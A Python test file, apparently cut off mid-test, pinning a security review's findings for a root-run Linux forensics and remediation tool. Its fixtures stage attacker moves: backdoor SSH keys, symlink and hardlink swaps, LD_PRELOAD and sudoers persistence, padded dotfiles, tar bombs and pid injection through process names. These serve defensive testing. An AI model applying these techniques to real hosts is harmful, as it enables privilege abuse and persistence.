"""Regression tests for the 2026-11 external security review (items F-01–F-14).

Threat model: ubuntils runs as root on a host where an unprivileged attacker
may still be active — they control their home directory, dotfiles,
authorized_keys, process names and log lines. Bundles are untrusted input.
Each test is named after the finding it pins.
"""
import base64
import hashlib
import json
import os
import time

from ubuntils.collectors.source import LiveSource
from ubuntils.detectors.finding import RemediationResult, RemediationStatus


def _key_data(seed: bytes) -> str:
    """A well-formed ssh-ed25519 public key blob (base64), unique per seed."""
    raw = hashlib.sha256(seed).digest()
    blob = (len(b"ssh-ed25519").to_bytes(4, "big") + b"ssh-ed25519"
            + len(raw).to_bytes(4, "big") + raw)
    return base64.b64encode(blob).decode()


def _fingerprint(key_data: str) -> str:
    """How sshd logs a key: SHA256 of the blob, unpadded base64."""
    digest = hashlib.sha256(base64.b64decode(key_data)).digest()
    return "SHA256:" + base64.b64encode(digest).decode().rstrip("=")


def _tree(root, files: dict) -> str:
    for path, content in files.items():
        dest = root / path.lstrip("/")
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_text(content)
    return str(root)


class _FakeHost(LiveSource):
    """A live-looking host: files from a tmp tree, commands from canned output."""

    def __init__(self, root, outputs=None):
        super().__init__(root=root)
        self.outputs = outputs or {}

    def run(self, name, argv, timeout=30):
        return self.outputs.get(name, ("", "", -1))


def _journal(*messages, program="sshd") -> str:
    now_us = int(time.time() * 1_000_000)
    return "\n".join(
        json.dumps({"__REALTIME_TIMESTAMP": str(now_us - i), "MESSAGE": m,
                    "SYSLOG_IDENTIFIER": program})
        for i, m in enumerate(messages)
    )


# ─── F-03: ambiguous_key must hard-block auto-remediation ───────────────────

_ADMIN_KEY = _key_data(b"admin")
_ATTACKER_KEY = _key_data(b"attacker")


def _two_key_host(tmp_path, journal: str):
    root = _tree(tmp_path / "host", {
        "/etc/passwd": "alice:x:1001:1001::/home/alice:/bin/bash\n",
        "/home/alice/.ssh/authorized_keys": (
            f"ssh-ed25519 {_ADMIN_KEY} admin@laptop\n"
            f"ssh-ed25519 {_ATTACKER_KEY} backdoor\n"
        ),
    })
    return _FakeHost(root, {"journalctl": (journal, "", 0)})


def test_F03_routine_login_line_cannot_unblock_remediation_of_ambiguous_keys(
        tmp_path, monkeypatch):
    from ubuntils.pipeline import run_scan
    from ubuntils.remediators.ssh import SSHRemediator

    calls = []

    def _record(self, finding, dry_run=True):
        calls.append(finding)
        return RemediationResult(finding.rule_id, RemediationStatus.SUCCESS, "removed")

    monkeypatch.setattr(SSHRemediator, "remediate", _record)
    # A routine (or `logger -t sshd`-forged) line naming only the user.
    source = _two_key_host(tmp_path, _journal(
        "Accepted publickey for alice from 10.0.0.5 port 50000 ssh2"))

    result = run_scan(source, remediate=True, confirm=True, forward_wazuh=False)

    ssh = [f for f in result.findings if f.rule_id == "SSH_UNAUTHORIZED_KEY"]
    assert len(ssh) == 2
    assert all(f.auto_remediation_blocked for f in ssh)
    assert calls == []  # neither key — the admin's included — was touched
    ssh_results = [r for r in result.remediation_results
                   if r.finding_rule_id == "SSH_UNAUTHORIZED_KEY"]
    assert len(ssh_results) == 2
    assert all(r.status == RemediationStatus.SKIPPED for r in ssh_results)
    assert all("blocked" in r.message for r in ssh_results)


def test_F03_block_holds_whatever_the_confidence():
    from ubuntils.detectors.finding import Finding, Severity
    from ubuntils.pipeline import remediate_findings
    finding = Finding(rule_id="SSH_UNAUTHORIZED_KEY", severity=Severity.MEDIUM, title="t",
                      description="d", artifact_path="/nonexistent/authorized_keys",
                      raw_value="ssh-ed25519 AAAA x", remediation_available=True,
                      confidence=100, auto_remediation_blocked="ambiguous key")
    [result] = remediate_findings([finding], confirm=True, min_confidence=0)
    assert result.status == RemediationStatus.SKIPPED
    assert "ambiguous key" in result.message


def test_F03_username_alone_does_not_corroborate_an_ssh_key(tmp_path):
    from ubuntils.pipeline import run_scan
    source = _two_key_host(tmp_path, _journal(
        "Accepted publickey for alice from 10.0.0.5 port 50000 ssh2"))
    result = run_scan(source, forward_wazuh=False)
    for f in result.findings:
        if f.rule_id == "SSH_UNAUTHORIZED_KEY":
            assert "timeline_corroboration" not in [s["name"] for s in f.signals]
            # Still shown as context for the responder.
            assert f.related_events


def test_F03_login_with_the_keys_fingerprint_corroborates_only_that_key(tmp_path):
    from ubuntils.pipeline import run_scan
    source = _two_key_host(tmp_path, _journal(
        "Accepted publickey for alice from 10.0.0.5 port 50000 ssh2: ED25519 "
        + _fingerprint(_ATTACKER_KEY)))
    result = run_scan(source, forward_wazuh=False)
    by_key = {f.raw_value.split()[1]: f for f in result.findings
              if f.rule_id == "SSH_UNAUTHORIZED_KEY"}
    names = {k: [s["name"] for s in f.signals] for k, f in by_key.items()}
    assert "timeline_corroboration" in names[_ATTACKER_KEY]
    assert "timeline_corroboration" not in names[_ADMIN_KEY]
    # Corroboration ranks it higher but never lifts the block.
    assert by_key[_ATTACKER_KEY].auto_remediation_blocked


def test_F03_lone_key_is_not_blocked():
    from ubuntils.detectors.rules import rule_ssh_unauthorized_key
    now = time.time()
    [finding] = rule_ssh_unauthorized_key({"authorized_keys": [{
        "username": "alice", "home": "/home/alice", "path": "/home/alice/.ssh/authorized_keys",
        "key_type": "ssh-ed25519", "key_data": _ATTACKER_KEY, "comment": "x", "options": "",
        "raw_line": f"ssh-ed25519 {_ATTACKER_KEY} x", "file_mtime": now, "file_ctime": now,
    }]})
    assert finding.auto_remediation_blocked is None


def test_F03_confirm_modal_and_report_show_the_block_reason():
    from ubuntils.detectors.finding import Finding, Severity
    from ubuntils.formatters.json_formatter import JSONFormatter
    from ubuntils.tui.findings_panel import _detail_text
    finding = Finding(rule_id="SSH_UNAUTHORIZED_KEY", severity=Severity.MEDIUM, title="t",
                      description="d", artifact_path="/home/a/.ssh/authorized_keys",
                      raw_value="ssh-ed25519 AAAA x", remediation_available=True,
                      auto_remediation_blocked="file holds 2 keys")
    assert "file holds 2 keys" in _detail_text(finding)
    assert JSONFormatter()._finding(finding)["auto_remediation_blocked"] == "file holds 2 keys"


async def test_F03_confirm_modal_warns_about_a_blocked_finding():
    from textual.app import App
    from textual.widgets import Static
    from ubuntils.detectors.finding import Finding, Severity
    from ubuntils.tui.confirm_modal import ConfirmModal
    finding = Finding(rule_id="SSH_UNAUTHORIZED_KEY", severity=Severity.MEDIUM, title="t",
                      description="d", artifact_path="/home/a/.ssh/authorized_keys",
                      raw_value="ssh-ed25519 AAAA x", remediation_available=True,
                      auto_remediation_blocked="file holds 2 keys")

    class _App(App):
        def on_mount(self):
            self.push_screen(ConfirmModal(finding))

    async with _App().run_test() as pilot:
        await pilot.pause()
        warning = pilot.app.screen.query_one("#blocked-warning", Static)
        assert "file holds 2 keys" in str(warning.render())


# ─── F-02: never write into an existing file someone else owns ──────────────

def test_F02_report_refuses_an_existing_file_owned_by_another_user(tmp_path, monkeypatch):
    import pytest
    from ubuntils.utils import safe_io
    planted = tmp_path / "report.json"
    planted.write_text("attacker's file")
    # We "are" a different uid than the file's owner (the attacker).
    monkeypatch.setattr(safe_io.os, "geteuid", lambda: planted.stat().st_uid + 1)
    with pytest.raises(OSError, match="owned by uid"):
        safe_io.write_private_text(str(planted), "secret report")
    assert planted.read_text() == "attacker's file"


def test_F02_report_accepts_an_existing_file_owned_by_the_sudo_user(tmp_path, monkeypatch):
    from ubuntils.utils import safe_io
    mine = tmp_path / "report.json"
    mine.write_text("old")
    owner = mine.stat().st_uid
    monkeypatch.setattr(safe_io.os, "geteuid", lambda: owner + 1)  # "root"
    safe_io.write_private_text(str(mine), "new", trusted_uids={owner})
    assert mine.read_text() == "new"


def test_F02_report_refuses_a_hardlinked_file(tmp_path):
    import pytest
    from ubuntils.utils import safe_io
    target = tmp_path / "target"
    target.write_text("keep me")
    os.link(target, tmp_path / "report.json")
    with pytest.raises(OSError, match="hard links"):
        safe_io.write_private_text(str(tmp_path / "report.json"), "secret report")
    assert target.read_text() == "keep me"


def test_F02_cli_report_refusal_is_a_clean_error(tmp_path, monkeypatch):
    from click.testing import CliRunner
    from ubuntils.cli import main
    from ubuntils.pipeline import ScanResult
    monkeypatch.setattr("ubuntils.cli._ensure_root", lambda: None)
    monkeypatch.setattr("ubuntils.cli.run_scan", lambda *a, **k: ScanResult(
        findings=[], timeline=[], stats={}, scan_metadata={}, artifact_counts={}))
    target = tmp_path / "victim"
    target.write_text("keep me")
    os.link(target, tmp_path / "report.json")
    result = CliRunner().invoke(main, ["scan", "--output", str(tmp_path / "report.json")])
    assert result.exit_code != 0
    assert "Cannot write report" in result.output
    assert target.read_text() == "keep me"


def test_F02_bundle_is_never_written_into_an_existing_file(tmp_path, monkeypatch):
    from click.testing import CliRunner
    from ubuntils.cli import main
    monkeypatch.setattr("ubuntils.cli._ensure_root", lambda: None)
    planted = tmp_path / "bundle.tar.gz"
    planted.write_text("")  # pre-created by an attacker, who would keep owning it
    result = CliRunner().invoke(main, ["collect", "--output", str(planted)])
    assert result.exit_code != 0
    assert "already exists" in result.output
    assert planted.read_text() == ""


def test_F02_default_bundle_path_is_private_and_unpredictable(tmp_path, monkeypatch):
    import stat
    from ubuntils import cli
    bundle_dir = tmp_path / "var" / "lib" / "ubuntils" / "bundles"
    monkeypatch.setattr(cli, "DEFAULT_BUNDLE_DIR", str(bundle_dir))
    first, second = cli._default_bundle_path(), cli._default_bundle_path()
    assert first != second
    assert os.path.dirname(first) == str(bundle_dir)
    assert os.path.basename(first).startswith("ubuntils-bundle-")
    assert stat.S_IMODE(bundle_dir.stat().st_mode) == 0o700


def test_F02_default_bundle_dir_must_not_be_a_symlink_or_foreign(tmp_path, monkeypatch):
    import pytest
    from ubuntils import cli
    from ubuntils.utils import safe_io
    elsewhere = tmp_path / "attacker"
    elsewhere.mkdir()
    (tmp_path / "lib").mkdir()
    os.symlink(elsewhere, tmp_path / "lib" / "bundles")
    monkeypatch.setattr(cli, "DEFAULT_BUNDLE_DIR", str(tmp_path / "lib" / "bundles"))
    with pytest.raises(OSError):
        cli._default_bundle_path()

    real = tmp_path / "foreign"
    real.mkdir(mode=0o700)
    monkeypatch.setattr(cli, "DEFAULT_BUNDLE_DIR", str(real))
    monkeypatch.setattr(safe_io.os, "geteuid", lambda: real.stat().st_uid + 1)
    with pytest.raises(OSError, match="owned by uid"):
        cli._default_bundle_path()


# ─── F-01 / F-04: path resolution in remediation and rollback ───────────────

def _homes(tmp_path):
    """alice (the attacker) and admin, each with one authorized key."""
    alice, admin = tmp_path / "home" / "alice", tmp_path / "home" / "admin"
    for home, key in ((alice, _ATTACKER_KEY), (admin, _ADMIN_KEY)):
        (home / ".ssh").mkdir(parents=True)
        (home / ".ssh" / "authorized_keys").write_text(f"ssh-ed25519 {key} k\n")
    return alice, admin


def _key_finding(path, key, identity=None):
    from ubuntils.detectors.finding import Finding, Severity
    return Finding(rule_id="SSH_UNAUTHORIZED_KEY", severity=Severity.MEDIUM, title="t",
                   description="d", artifact_path=str(path),
                   raw_value=f"ssh-ed25519 {key} k", remediation_available=True,
                   parent_dir_identity=identity)


class _PasswdOnly(LiveSource):
    """The live filesystem, except for a fake /etc/passwd."""

    def __init__(self, passwd):
        super().__init__(root="/")
        self.passwd = passwd

    def read_text(self, path):
        return self.passwd if path == "/etc/passwd" else super().read_text(path)


def test_F04_symlinked_parent_dir_is_refused(tmp_path):
    from ubuntils.remediators.ssh import SSHRemediator
    alice, admin = _homes(tmp_path)
    # alice swaps her .ssh for a link to the admin's, keeping a key line that
    # matches what was reported for her.
    (admin / ".ssh" / "authorized_keys").write_text(
        f"ssh-ed25519 {_ATTACKER_KEY} k\nssh-ed25519 {_ADMIN_KEY} k\n")
    before = (admin / ".ssh" / "authorized_keys").read_text()
    (alice / ".ssh" / "authorized_keys").unlink()
    (alice / ".ssh").rmdir()
    os.symlink(admin / ".ssh", alice / ".ssh")

    result = SSHRemediator(backup_base=str(tmp_path / "b")).remediate(
        _key_finding(alice / ".ssh" / "authorized_keys", _ATTACKER_KEY), dry_run=False)

    assert result.status == RemediationStatus.FAILED
    assert "symlink" in result.message
    assert (admin / ".ssh" / "authorized_keys").read_text() == before
    assert not (tmp_path / "b").exists()


def test_F04_parent_dir_swapped_after_detection_is_refused(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.detectors.rules import rule_ssh_unauthorized_key
    from ubuntils.remediators.ssh import SSHRemediator
    alice, _admin = _homes(tmp_path)
    source = _PasswdOnly(f"alice:x:1001:1001::{alice}:/bin/bash\n")
    [finding] = rule_ssh_unauthorized_key(SSHCollector(source=source).collect())
    assert finding.parent_dir_identity is not None

    # Between detection and remediation: a different directory (new inode)
    # with matching content takes .ssh's place.
    os.rename(alice / ".ssh", alice / ".ssh.orig")
    (alice / ".ssh").mkdir()
    (alice / ".ssh" / "authorized_keys").write_text(f"ssh-ed25519 {_ATTACKER_KEY} k\n")

    result = SSHRemediator(backup_base=str(tmp_path / "b")).remediate(finding, dry_run=False)
    assert result.status == RemediationStatus.FAILED
    assert "not the directory the finding was made on" in result.message
    assert (alice / ".ssh" / "authorized_keys").read_text() != ""


def test_F04_collectors_record_parent_dir_identity(tmp_path):
    from ubuntils.collectors.cron import CronCollector
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.collectors.sudoers import SudoersCollector
    root = _tree(tmp_path, {
        "/etc/passwd": "alice:x:1001:1001::/home/alice:/bin/bash\n",
        "/etc/crontab": "* * * * * root /tmp/x.sh\n",
        "/etc/environment": "LD_PRELOAD=/tmp/evil.so\n",
        "/etc/sudoers": "alice ALL=(ALL) NOPASSWD: ALL\n",
    })
    source = LiveSource(root=root, offline=True)
    etc = os.lstat(os.path.join(root, "etc"))
    expected = [etc.st_dev, etc.st_ino, etc.st_uid]
    assert CronCollector(source=source).collect()["cron_entries"][0]["parent_dir_id"] == expected
    env = EnvironmentCollector(source=source).collect()["env_definitions"]
    assert env[0]["parent_dir_id"] == expected
    rules_ = SudoersCollector(source=source).collect()["sudoers_rules"]
    assert rules_[0]["parent_dir_id"] == expected


def _remediated(tmp_path, mode=0o640):
    """A finished remediation: (artifact, backup_path, result)."""
    from ubuntils.remediators.cron import CronRemediator
    from ubuntils.detectors.finding import Finding, Severity
    cron = tmp_path / "etc" / "cron.d" / "job"
    cron.parent.mkdir(parents=True)
    cron.write_text("* * * * * root /tmp/a.sh\n0 0 * * * root /usr/bin/ok\n")
    os.chmod(cron, mode)
    finding = Finding(rule_id="CRON_TMP_PATH", severity=Severity.HIGH, title="t",
                      description="d", artifact_path=str(cron),
                      raw_value="* * * * * root /tmp/a.sh", remediation_available=True)
    result = CronRemediator(backup_base=str(tmp_path / "b")).remediate(finding, dry_run=False)
    assert result.status == RemediationStatus.SUCCESS, result.message
    return cron, result.backup_path, result


def test_F01_rollback_command_is_ubuntils_rollback_never_cp(tmp_path):
    import shlex
    _cron, backup, result = _remediated(tmp_path)
    assert shlex.split(result.rollback_command) == ["ubuntils", "rollback", backup]
    sidecar = json.loads(open(backup + ".json").read())
    assert sidecar["original_path"] == str(_cron)
    assert {"uid", "gid", "mode", "parent_dev", "parent_ino", "post_sha256"} <= set(sidecar)
    assert sidecar["post_sha256"] == hashlib.sha256(_cron.read_bytes()).hexdigest()


def test_F01_rollback_restores_content_mode_and_owner(tmp_path):
    from ubuntils.remediators.rollback import rollback
    cron, backup, _ = _remediated(tmp_path, mode=0o640)
    os.chmod(cron, 0o600)  # mode drifts; content is what remediation left
    rollback(backup)
    st = cron.stat()
    assert cron.read_text() == "* * * * * root /tmp/a.sh\n0 0 * * * root /usr/bin/ok\n"
    assert st.st_mode & 0o777 == 0o640
    sidecar = json.loads(open(backup + ".json").read())
    assert (st.st_uid, st.st_gid) == (sidecar["uid"], sidecar["gid"])


def test_F01_rollback_refuses_when_target_became_a_symlink(tmp_path):
    import pytest
    from ubuntils.remediators.rollback import rollback
    cron, backup, _ = _remediated(tmp_path)
    victim = tmp_path / "shadow"
    victim.write_text("root:$6$hash:::\n")
    cron.unlink()
    os.symlink(victim, cron)
    for force in (False, True):
        with pytest.raises(OSError, match="symlink|regular file"):
            rollback(backup, force=force)
    assert victim.read_text() == "root:$6$hash:::\n"
    assert os.path.islink(cron)


def test_F01_rollback_refuses_when_parent_dir_became_a_symlink(tmp_path):
    import pytest
    from ubuntils.remediators.rollback import rollback
    cron, backup, _ = _remediated(tmp_path)
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "job").write_text(cron.read_text())
    os.rename(cron.parent, tmp_path / "etc" / "cron.d.moved")
    os.symlink(elsewhere, cron.parent)
    for force in (False, True):
        with pytest.raises(OSError, match="symlink"):
            rollback(backup, force=force)
    assert (elsewhere / "job").read_text() == "0 0 * * * root /usr/bin/ok\n"


def test_F01_rollback_refuses_a_changed_file_or_dir_unless_forced(tmp_path):
    import pytest
    from ubuntils.remediators.rollback import RollbackError, rollback
    cron, backup, _ = _remediated(tmp_path)
    cron.write_text("edited by the admin since\n")
    with pytest.raises(RollbackError, match="changed since"):
        rollback(backup)
    assert cron.read_text() == "edited by the admin since\n"
    assert "forced past" in rollback(backup, force=True)
    assert cron.read_text().startswith("* * * * * root /tmp/a.sh")

    # A different directory (new inode) in the old one's place.
    cron2, backup2, _ = _remediated(tmp_path / "second")
    content = cron2.read_text()
    os.rename(cron2.parent, cron2.parent.with_name("old"))
    cron2.parent.mkdir()
    cron2.write_text(content)
    with pytest.raises(RollbackError, match="different inode"):
        rollback(backup2)


def test_F01_rollback_refuses_a_backup_it_did_not_write(tmp_path, monkeypatch):
    import pytest
    from ubuntils.remediators import rollback as rb
    _cron, backup, _ = _remediated(tmp_path)
    monkeypatch.setattr(rb.os, "geteuid", lambda: os.stat(backup).st_uid + 1)
    with pytest.raises(rb.RollbackError, match="owned by uid"):
        rb.rollback(backup)


def test_F01_cli_rollback(tmp_path, monkeypatch):
    from click.testing import CliRunner
    from ubuntils.cli import main
    monkeypatch.setattr("ubuntils.cli._ensure_root", lambda: None)
    cron, backup, _ = _remediated(tmp_path)
    ok = CliRunner().invoke(main, ["rollback", backup])
    assert ok.exit_code == 0, ok.output
    assert "Restored" in ok.output
    refused = CliRunner().invoke(main, ["rollback", backup])  # content changed now
    assert refused.exit_code != 0 and "Rollback refused" in refused.output


# ─── F-05: oversized user-controlled files become findings ──────────────────

def _padded(n_bytes: int, tail: str) -> str:
    line = "# " + "x" * 98 + "\n"
    return line * (n_bytes // len(line)) + tail


def test_F05_padded_authorized_keys_still_yields_the_key_and_a_finding(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.detectors.engine import DetectionEngine
    root = _tree(tmp_path, {
        "/etc/passwd": "eve:x:1000:1000::/home/eve:/bin/bash\n",
        "/home/eve/.ssh/authorized_keys": _padded(
            1536 * 1024, f"ssh-ed25519 {_ATTACKER_KEY} hidden\n"),
    })
    artifacts = SSHCollector(source=LiveSource(root=root, offline=True)).collect()
    assert [k["key_data"] for k in artifacts["authorized_keys"]] == [_ATTACKER_KEY]
    assert artifacts["authorized_keys"][0]["oversized"] is True

    findings = DetectionEngine().run(artifacts)
    rule_ids = {f.rule_id for f in findings}
    assert {"SSH_UNAUTHORIZED_KEY", "USER_FILE_OVERSIZED"} <= rule_ids
    [oversized] = [f for f in findings if f.rule_id == "USER_FILE_OVERSIZED"]
    assert oversized.artifact_path == "/home/eve/.ssh/authorized_keys"
    assert oversized.remediation_available is False


def test_F05_padded_bashrc_and_user_unit_are_read_and_flagged(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.collectors.systemd import SystemdCollector
    from ubuntils.detectors.rules import rule_ld_preload_inject, rule_user_file_oversized
    root = _tree(tmp_path, {
        "/etc/passwd": "eve:x:1000:1000::/home/eve:/bin/bash\n",
        "/home/eve/.bashrc": _padded(1100 * 1024, "export LD_PRELOAD=/tmp/evil.so\n"),
        "/home/eve/.config/systemd/user/x.service": _padded(
            1100 * 1024, "[Service]\nExecStart=/tmp/x\n"),
    })
    source = LiveSource(root=root, offline=True)
    artifacts = EnvironmentCollector(source=source).collect()
    artifacts.update(SystemdCollector(source=source).collect())
    assert rule_ld_preload_inject(artifacts)  # the line past the padding was seen
    assert any(s["exec_start"] == "/tmp/x" for s in artifacts["services"])
    paths = {f.artifact_path for f in rule_user_file_oversized(artifacts)}
    assert paths == {"/home/eve/.bashrc", "/home/eve/.config/systemd/user/x.service"}


def test_F05_normal_files_and_system_files_are_not_flagged(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.detectors.rules import rule_user_file_oversized
    root = _tree(tmp_path, {
        "/etc/passwd": "eve:x:1000:1000::/home/eve:/bin/bash\n",
        "/etc/bash.bashrc": _padded(1100 * 1024, ""),  # root's own file
        "/home/eve/.bashrc": "alias ll='ls -l'\n",
    })
    artifacts = EnvironmentCollector(source=LiveSource(root=root, offline=True)).collect()
    assert rule_user_file_oversized(artifacts) == []


def test_F05_reading_stops_at_the_hard_ceiling(tmp_path, monkeypatch):
    from ubuntils.collectors import source as source_mod
    monkeypatch.setattr(source_mod, "USER_FILE_HARD_MAX_BYTES", 4096)
    big = tmp_path / "f"
    big.write_text("y" * 10_000)
    user_file = LiveSource().read_user_file(str(big))
    assert len(user_file.text) == 4096
    assert user_file.truncated and user_file.oversized is False  # 10 KB < 1 MiB
    assert user_file.size == 10_000


def test_F05_wazuh_forwards_oversized_findings():
    from ubuntils.detectors.rules import rule_user_file_oversized
    from ubuntils.integrations.wazuh import _finding_to_dict
    [finding] = rule_user_file_oversized({"oversized_authorized_keys": [
        {"path": "/home/eve/.ssh/authorized_keys", "size": 2_000_000,
         "kind": "authorized_keys"}]})
    assert _finding_to_dict(finding, "h")["rule_id"] == "USER_FILE_OVERSIZED"


# ─── F-09: bounded Wazuh events ─────────────────────────────────────────────

def _wazuh_finding(**overrides):
    from ubuntils.detectors.finding import Finding, Severity
    fields = dict(rule_id="SHELL_RC_MODIFICATION", severity=Severity.MEDIUM, title="t",
                  description="d", artifact_path="/home/eve/.bashrc", raw_value="r",
                  remediation_available=False)
    fields.update(overrides)
    return Finding(**fields)


def _event(description):
    import datetime
    from ubuntils.timeline.builder import TimelineEvent
    return TimelineEvent(timestamp=datetime.datetime.now(datetime.timezone.utc),
                         source="journald", description=description, program="logger")


def test_F09_huge_related_events_are_cut_to_a_bounded_line():
    from ubuntils.integrations.wazuh import MAX_LINE_BYTES, finding_line
    finding = _wazuh_finding(related_events=[_event("A" * 48 * 1024) for _ in range(5)])
    line = finding_line(finding, "host1")
    assert len(line.encode()) < MAX_LINE_BYTES
    event = json.loads(line)
    assert event["truncated"] is True
    assert all(len(e["description"]) <= 1024 for e in event["related_events"])


def test_F09_string_fields_are_capped_and_untouched_events_are_not_marked():
    from ubuntils.integrations.wazuh import finding_line
    assert "truncated" not in json.loads(finding_line(_wazuh_finding(), "h"))
    event = json.loads(finding_line(_wazuh_finding(raw_value="x" * 10_000), "h"))
    assert len(event["raw_value"]) == 2048 and event["truncated"] is True


def test_F09_escaping_blowup_drops_related_events_and_stays_bounded():
    # A NUL serialises as \u0000 (six bytes): capped fields can still blow
    # past the line limit.
    from ubuntils.integrations.wazuh import MAX_LINE_BYTES, finding_line
    nul = "\x00" * 5000
    finding = _wazuh_finding(description=nul, raw_value=nul, artifact_path=nul, title=nul,
                             related_events=[_event(nul) for _ in range(5)])
    line = finding_line(finding, "h")
    assert len(line.encode()) <= MAX_LINE_BYTES
    event = json.loads(line)
    assert event["truncated"] is True and "related_events" not in event


def test_F09_degraded_collectors_are_forwarded_as_a_summary_event(tmp_path):
    from ubuntils.integrations.wazuh import DEGRADED_RULE_ID, write_wazuh_alerts
    log = tmp_path / "alerts.json"
    written = write_wazuh_alerts([], "host1", log_path=str(log), collectors_degraded={
        "SSHCollector": ["skipped /home/eve/.ssh/authorized_keys: not a regular file"]})
    assert written == str(log)
    [event] = [json.loads(line) for line in log.read_text().splitlines()]
    assert event["rule_id"] == DEGRADED_RULE_ID
    assert event["collectors_degraded"] == ["SSHCollector"]
    assert "not a regular file" in event["description"]


def test_F09_pipeline_passes_degraded_collectors_to_wazuh(monkeypatch, tmp_path):
    from unittest.mock import patch
    from ubuntils.pipeline import run_scan
    root = _tree(tmp_path, {"/etc/passwd": "x:broken\n"})
    with patch("ubuntils.pipeline.is_wazuh_agent_present", return_value=True), \
            patch("ubuntils.pipeline.write_wazuh_alerts") as write:
        result = run_scan(_FakeHost(root))
    assert result.scan_metadata["collectors_degraded"]
    assert write.call_args.kwargs["collectors_degraded"] == \
        result.scan_metadata["collectors_degraded"]


# ─── F-10: capped bundle extraction ─────────────────────────────────────────

def _tar_with_headers(path, members):
    """A gzip tarball of (name, declared_size, data) members. A member can
    declare far more than it holds: the header is all the reader may check."""
    import gzip
    import tarfile
    with gzip.open(path, "wb") as gz:
        for name, size, data in members:
            info = tarfile.TarInfo(name)
            info.size = size
            gz.write(info.tobuf(format=tarfile.GNU_FORMAT))
            gz.write(data + b"\0" * (-len(data) % 512))
        gz.write(b"\0" * 1024)


def test_F10_member_declaring_more_than_the_cap_is_refused(tmp_path):
    import pytest
    from ubuntils.bundle import BundleError, read_bundle
    from ubuntils.bundle.reader import MAX_MEMBER_BYTES
    bomb = tmp_path / "bomb.tar.gz"
    _tar_with_headers(bomb, [("bundle/files/var/log/syslog", MAX_MEMBER_BYTES + 1, b"")])
    with pytest.raises(BundleError, match="declares"):
        read_bundle(str(bomb))


def test_F10_too_many_members_or_too_many_bytes_is_refused(tmp_path, monkeypatch):
    import pytest
    from ubuntils.bundle import BundleError, read_bundle
    from ubuntils.bundle import reader
    small = tmp_path / "many.tar.gz"
    _tar_with_headers(small, [(f"bundle/files/f{i}", 4, b"data") for i in range(6)])
    monkeypatch.setattr(reader, "MAX_BUNDLE_MEMBERS", 5)
    with pytest.raises(BundleError, match="more than 5 members"):
        read_bundle(str(small))
    monkeypatch.setattr(reader, "MAX_BUNDLE_MEMBERS", 10_000)
    monkeypatch.setattr(reader, "MAX_BUNDLE_BYTES", 20)
    with pytest.raises(BundleError, match="exceed"):
        read_bundle(str(small))


def test_F10_bundle_source_reads_are_capped(tmp_path, monkeypatch):
    import pytest
    from ubuntils.collectors import source as source_mod
    from ubuntils.collectors.source import BundleSource, UnsafeFileError
    (tmp_path / "etc").mkdir()
    (tmp_path / "etc" / "big").write_bytes(b"z" * 100)
    (tmp_path / "out.txt").write_bytes(b"z" * 100)
    monkeypatch.setattr(source_mod, "BUNDLE_READ_MAX_BYTES", 50)
    src = BundleSource(root_dir=str(tmp_path), command_index={"ss": str(tmp_path / "out.txt")})
    with pytest.raises(UnsafeFileError):
        src.read_text("/etc/big")
    with pytest.raises(UnsafeFileError):
        src.run("ss", ["ss"])


# ─── F-08: integrity covers unlisted and absent files ───────────────────────

def _repacked_bundle(tmp_path, inject: dict):
    """A genuine bundle (manifest untouched) with extra files slipped in."""
    import tarfile
    from ubuntils.bundle import write_bundle
    host = _tree(tmp_path / "host", {"/etc/passwd": "root:x:0:0::/root:/bin/bash\n"})
    out = tmp_path / "bundle.tar.gz"
    write_bundle(source=LiveSource(root=host), out_path=str(out),
                 files_to_capture=["/etc/passwd", "/etc/ld.so.preload"],
                 commands_to_capture=[],
                 metadata={"hostname": "h", "ubuntu_version": "U", "tool_version": "t"})
    extract = tmp_path / "x"
    with tarfile.open(out, "r:gz") as tf:
        tf.extractall(extract)
    for rel, content in inject.items():
        dest = extract / "bundle" / rel
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_text(content)
    out.unlink()
    with tarfile.open(out, "w:gz") as tf:
        tf.add(str(extract / "bundle"), arcname="bundle")
    return str(out)


def test_F08_untouched_bundle_still_verifies(tmp_path):
    from ubuntils.bundle import read_bundle
    source, info = read_bundle(_repacked_bundle(tmp_path, {}))
    source.cleanup()
    assert info["bundle_integrity"] == "ok"


def test_F08_file_recorded_absent_but_present_is_a_mismatch(tmp_path):
    from ubuntils.bundle import read_bundle
    source, info = read_bundle(_repacked_bundle(
        tmp_path, {"files/etc/ld.so.preload": "/tmp/evil.so\n"}))
    source.cleanup()
    assert info["bundle_integrity"] == "mismatch"


def test_F08_unlisted_file_is_a_mismatch(tmp_path):
    from ubuntils.bundle import read_bundle
    for rel in ("files/etc/cron.d/x", "commands/extra.txt"):
        source, info = read_bundle(_repacked_bundle(tmp_path / rel.replace("/", "_"),
                                                    {rel: "* * * * * root /tmp/x\n"}))
        source.cleanup()
        assert info["bundle_integrity"] == "mismatch", rel


# ─── F-06: process names can't steer PID attribution ────────────────────────

_SS_HEADER = "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"


def _ss_line(owners: str) -> str:
    return f"tcp ESTAB 0 0 10.0.0.2:40000 203.0.113.9:4444 users:(({owners}))\n"


def _connections(tmp_path, ss_text, comm=None):
    from ubuntils.collectors.network import NetworkCollector
    files = {"/etc/hostname": "h\n"}
    files.update({f"/proc/{pid}/comm": name + "\n" for pid, name in (comm or {}).items()})
    collector = NetworkCollector(source=_FakeHost(_tree(tmp_path, files),
                                                  {"ss": (_SS_HEADER + ss_text, "", 0)}))
    return collector.collect()["connections"], collector


def test_F06_injected_pid_in_a_process_name_is_ignored(tmp_path):
    conns, _ = _connections(tmp_path, _ss_line('"x",pid=1,",pid=4242,fd=3)'))
    assert conns[0]["pid"] == "4242"


def test_F06_name_shaped_like_a_whole_owner_group_still_loses(tmp_path):
    conns, _ = _connections(tmp_path, _ss_line('"a",pid=1,fd=2)",pid=4242,fd=3)'),
                            comm={"4242": 'a",pid=1,fd=2)'})
    assert conns[0]["pid"] == "4242"


def test_F06_pid_whose_comm_does_not_match_is_dropped(tmp_path):
    conns, collector = _connections(tmp_path, _ss_line('"sshd",pid=4242,fd=3)'),
                                    comm={"4242": "bash"})
